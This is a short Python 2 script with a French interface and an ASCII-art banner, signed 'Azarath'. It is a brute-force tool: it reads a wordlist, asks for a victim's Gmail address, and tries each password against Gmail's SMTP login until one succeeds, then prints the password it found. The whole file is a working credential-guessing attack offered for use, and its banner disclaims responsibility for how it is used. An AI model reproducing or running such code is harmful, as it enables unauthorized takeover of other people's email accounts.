#!/usr/bin/python
'''create by Azarath'''

import smtplib
from os import system

def main():
   print '================================================='
   print '                  -Azarath-                '
   print '================================================='
   print '                           '
   print '                                           '
   print '       _,.                   '
   print '     ,` -.)                  '
   print '    ( _/-\\-._               '
   print '   /,|`--._,-^|             '
   print '   \_| |`-._/||   "Je ne suis pas responsable de vos actes."       '
   print '     |  `-, / |          '
   print '     |     || |           '
   print '      `r-._||/   __       '
   print '  __,-<_     )`-/  `.     '
   print '  \   `---    \   / /      '
   print '                            '
   print 'Version Française / French Version'
   print ' '
main()
print '[1] Commencer une attaque '
print '[2] Sortie'
option = input('Azarath: >')
if option == 1:
   file_path = raw_input('Chemin du fichier .txt de votre wordlist :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input('E-mail Victime :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] Mot De Passe du compte :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] Mot de passe du compte :' + password + '     ^_^'

            break
         else:
            print '[!]  En cours de recherche ...  => ' + password
login()
